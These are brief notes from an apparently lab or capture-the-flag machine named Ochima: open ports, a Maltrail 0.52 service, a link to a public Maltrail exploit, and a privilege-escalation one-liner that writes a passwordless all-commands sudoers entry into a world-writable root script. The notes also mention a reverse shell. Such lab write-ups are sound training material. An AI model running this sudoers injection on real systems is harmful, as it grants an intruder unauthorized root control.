# Ochima \[Inter]

## Report



### Hint

Our enumeration lil washed cus we on data pls excuse

## Cheatsheet

```
echo ‘echo “[user] ALL=(ALL) NOPASSWD: ALL” >> /etc/sudoers’ >> etc_Backup.sh
Reverse shell only worked for a port open on their side [80 and 8338]
```

## Loot

### Enumeration

192.168.137.32

22,80,8338

#### 8338

Maltrail/0.52

### Attack Vectors

{% embed url="https://github.com/spookier/Maltrail-v0.53-Exploit" %}

### PrivEsc

-rwxrwxrwx 1 root root 54 Dec 11 2023 etc\_Backup.sh

<figure><img src="../../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

### Creds

None

### Proof

None
